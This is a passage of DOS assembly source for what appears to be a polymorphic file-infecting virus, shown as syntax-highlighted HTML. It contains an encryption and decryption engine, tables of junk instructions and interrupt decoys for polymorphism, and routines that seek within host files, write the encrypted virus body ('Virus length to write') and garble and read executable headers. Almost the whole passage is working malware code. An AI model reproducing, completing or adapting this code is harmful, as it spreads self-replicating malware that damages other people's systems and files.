</span><span class="sc5">Remain</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;         /</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Push_Pop</span><span class="sc0">        </span><span class="sc1">;       /</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Overrun</span><span class="sc0">         </span><span class="sc1">;     /</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Invoke</span><span class="sc0">          </span><span class="sc1">;   /</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Resource</span><span class="sc0">        </span><span class="sc1">; /</span><span class="sc0">

</span><span class="sc5">Encoder</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">

</span><span class="sc5">Encryptor</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">6Dh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">

</span><span class="sc5">Storage</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pusha</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc5">Retrieve</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">Bytez</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; AH=0Fh, INT 10h, get current video mode</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">             </span><span class="sc1">; AH=01h, INT 13h, get disk status</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">             </span><span class="sc1">; AH=36h, INT 14h, ComShare installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">             </span><span class="sc1">; AH=43h, INT 15h, read system status</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">             </span><span class="sc1">; AH=88h, INT 15h, get extended memory size</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">             </span><span class="sc1">; AH=01h, INT 16h, keyboard keystroke check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">             </span><span class="sc1">; AH=02h, INT 16h, get SHIFT key flags state</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">             </span><span class="sc1">; AH=70h, INT 16h, SEA FAKEY installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">             </span><span class="sc1">; AH=60h, INT 17h, Flash-Up installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">             </span><span class="sc1">; AH=61h, INT 17h, SPEEDSCR installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">             </span><span class="sc1">; AH=00h, INT 1Ah, get number of clock ticks</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">             </span><span class="sc1">; AH=02h, INT 1Ah, get real-time clock time</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">             </span><span class="sc1">; AH=04h, INT 1Ah, get real-time clock date</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; AH=0Bh, INT 21h, get standard input status</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; AH=30h, INT 21h, get DOS version</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; AH=4Dh, INT 21h, get program's return code</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; AH=51h, INT 21h, get current PSP segment</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; AH=54h, INT 21h, get verify flag state</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; AH=62h, INT 21h, get current PSP segment</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">             </span><span class="sc1">; AH=00h, INT 2Ah, network installation check</span><span class="sc0">


                     </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Mathesis</span><span class="sc0"> </span><span class="sc5">scientiarum</span><span class="sc0"> </span><span class="sc5">genetrix</span><span class="sc0">


</span><span class="sc5">Wordz</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0CCABh</span><span class="sc0">              </span><span class="sc1">; Solar Designer's HiFont installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; INT 10h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0400h</span><span class="sc0">               </span><span class="sc1">; Microsoft System Journal TSRCOMM INT 14h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">                 </span><span class="sc1">; INT 14h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4DD4h</span><span class="sc0">               </span><span class="sc1">; HP 95-LX/100-LX/200-LX installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">                 </span><span class="sc1">; INT 15h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0F398h</span><span class="sc0">              </span><span class="sc1">; Norton Guides installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">                 </span><span class="sc1">; INT 16h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">               </span><span class="sc1">; Brother P-Touch installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">                 </span><span class="sc1">; INT 17h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">3300h</span><span class="sc0">               </span><span class="sc1">; Extended break check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; INT 21h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5800h</span><span class="sc0">               </span><span class="sc1">; Get memory allocation strategy</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; INT 21h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0FF92h</span><span class="sc0">              </span><span class="sc1">; PC/TCP PREDIR.EXE installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">                 </span><span class="sc1">; INT 2Ah</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1600h</span><span class="sc0">               </span><span class="sc1">; MS Windows enhanced mode installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; INT 2Fh</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4010h</span><span class="sc0">               </span><span class="sc1">; OS/2 v2.00+ installation check / get version</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; INT 2Fh</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">8200h</span><span class="sc0">               </span><span class="sc1">; Nanosoft CAPDOS installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; INT 2Fh</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9900h</span><span class="sc0">               </span><span class="sc1">; DOS Navigator II installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; INT 2Fh</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0B700h</span><span class="sc0">              </span><span class="sc1">; APPEND.EXE installation check</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; INT 2Fh</span><span class="sc0">

</span><span class="sc5">Multimax</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">                    </span><span class="sc1">; INT 01h - single step interrupt</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">                    </span><span class="sc1">; INT 04h - INTO detected overflow</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">                    </span><span class="sc1">; INT 08h - IRQ 0, system timer</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Ah</span><span class="sc0">                    </span><span class="sc1">; INT 0Ah - IRQ 2, LPT2</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Bh</span><span class="sc0">                    </span><span class="sc1">; INT 0Bh - IRQ 3, serial COM2-COM8</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">                    </span><span class="sc1">; INT 0Ch - IRQ 4, serial COM1</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Dh</span><span class="sc0">                    </span><span class="sc1">; INT 0Dh - IRQ 5, fixed disk/LPT2/reserved IRQ</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Eh</span><span class="sc0">                    </span><span class="sc1">; INT 0Eh - IRQ 6, diskette controller</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Fh</span><span class="sc0">                    </span><span class="sc1">; INT 0Fh - IRQ 7, LPT1</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11h</span><span class="sc0">                    </span><span class="sc1">; INT 11h - BIOS, get equipment list</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">12h</span><span class="sc0">                    </span><span class="sc1">; INT 12h - BIOS, get conventional memory size</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">1Ch</span><span class="sc0">                    </span><span class="sc1">; INT 1Ch - system timer tick (called by IRQ 0)</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">28h</span><span class="sc0">                    </span><span class="sc1">; INT 28h - DOS 2.00+ idle interrupt</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Bh</span><span class="sc0">                    </span><span class="sc1">; INT 2Bh - reserved for IBM ROM-DOS v4.00 ??</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc0">                    </span><span class="sc1">; INT 70h - IRQ 8, CMOS RTC (Real-Time Clock)</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc0">                    </span><span class="sc1">; INT 71h - IRQ 9, redirected to IRQ 2</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">72h</span><span class="sc0">                    </span><span class="sc1">; INT 72h - IRQ 10, reserved IRQ</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">73h</span><span class="sc0">                    </span><span class="sc1">; INT 73h - IRQ 11, reserved IRQ</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">74h</span><span class="sc0">                    </span><span class="sc1">; INT 74h - IRQ 12, pointing device</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">75h</span><span class="sc0">                    </span><span class="sc1">; INT 75h - IRQ 13, coprocessor exception</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">76h</span><span class="sc0">                    </span><span class="sc1">; INT 76h - IRQ 14, hard disk controller</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">77h</span><span class="sc0">                    </span><span class="sc1">; INT 77h - IRQ 15, reserved IRQ</span><span class="sc0">

</span><span class="sc5">Ones</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; One-byte instructions...</span><span class="sc0">
 </span><span class="sc6">aaa</span><span class="sc0">                           </span><span class="sc1">; ASCII adjust AX after addition</span><span class="sc0">
 </span><span class="sc6">aas</span><span class="sc0">                           </span><span class="sc1">; ASCII adjust AX after subtraction</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">                           </span><span class="sc1">; Clear carry flag</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">; Clear direction flag</span><span class="sc0">
 </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">; Clear interrupt flag</span><span class="sc0">
 </span><span class="sc6">cmc</span><span class="sc0">                           </span><span class="sc1">; Complementary carry (toggle carry flag state)</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">                           </span><span class="sc1">; Convert word (AX) into doubleword (DX:AX)</span><span class="sc0">
 </span><span class="sc6">daa</span><span class="sc0">                           </span><span class="sc1">; Decimal adjust AX after addition</span><span class="sc0">
 </span><span class="sc6">das</span><span class="sc0">                           </span><span class="sc1">; Decimal adjust AX after subtraction</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">into</span><span class="sc0">                          </span><span class="sc1">; Generate INT 04h if overflow flag is set</span><span class="sc0">
 </span><span class="sc6">lahf</span><span class="sc0">                          </span><span class="sc1">; Store low 8-bit flags into AH</span><span class="sc0">
 </span><span class="sc6">nop</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">                           
 </span><span class="sc6">repnz</span><span class="sc0">                         
 </span><span class="sc6">sahf</span><span class="sc0">                          </span><span class="sc1">; Set low 8-bit flags equal to AH</span><span class="sc0">
 </span><span class="sc5">setalc</span><span class="sc0">                        </span><span class="sc1">; SETALC opcode (equal to SBB AL,AL)</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">                           </span><span class="sc1">; Set carry flag</span><span class="sc0">
 </span><span class="sc6">std</span><span class="sc0">                           </span><span class="sc1">; Set direction flag</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">; Set interrupt flag</span><span class="sc0">
 </span><span class="sc6">wait</span><span class="sc0">                          </span><span class="sc1">; Halt CPU until FPU finishes current opcode</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">xlat</span><span class="sc0">                          </span><span class="sc1">; MOV AL,DS:[BX+AL]</span><span class="sc0">

</span><span class="sc5">Fixup</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0B4h</span><span class="sc0">                   </span><span class="sc1">; MOV AH,XX</span><span class="sc0">

</span><span class="sc5">Keybyte</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                 </span><span class="sc1">; Dis is the cipher!</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BootStrap</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BootStrap</span><span class="sc0">

</span><span class="sc5">Interplay</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; Load a byte</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc5">Feed</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">0C4h</span><span class="sc0">            </span><span class="sc1">; ADD AL,AH/XOR AL,AH/SUB AL,AH/ADC AL,AH/SBB AL,AH</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Put it back</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">Interplay</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Strike</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Fixup</span><span class="sc0">                  </span><span class="sc1">; Now encrypt!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Feed</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">Food</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">            </span><span class="sc1">; Swap encryption type</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">              </span><span class="sc1">; Virus length to write</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">                           </span><span class="sc1">; SUB  DX,DX (AX must be positive)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; if CX = AX, all requested bytes written</span><span class="sc0">
                               </span><span class="sc1">; either, the disk might be full</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Fixup</span><span class="sc0">                  </span><span class="sc1">; Time to decrypt!</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">                           </span><span class="sc1">; And return</span><span class="sc0">

</span><span class="sc5">Lseek_BOF</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0A9h</span><span class="sc0">                   </span><span class="sc1">; TEST AX,02B0</span><span class="sc0">

</span><span class="sc5">Lseek_EOF</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">Lseeker</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">                 </span><span class="sc1">; File R/W pointer movement function</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; Zero CX</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">                           </span><span class="sc1">; Convert word into doubleword: AX ƒƒƒ DX:AX</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">RightWrite</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write function</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; AX = zero and ZF=1 if successful</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Undress</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0">

</span><span class="sc5">Scrap</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0018h</span><span class="sc0">               </span><span class="sc1">; 24 bytes header</span><span class="sc0">

</span><span class="sc5">Shatter</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">neg</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Lame garbling, as You can see... ;-)</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Why not use LOOP instead?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Shatter</span><span class="sc0">                </span><span class="sc1">; Well, we need ZF to be set on return</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Read_Head</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">               </span><span class="sc1">; Subtract virus length from file size</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Move R/W pointer to EOF / BOV</span><span class="sc0">
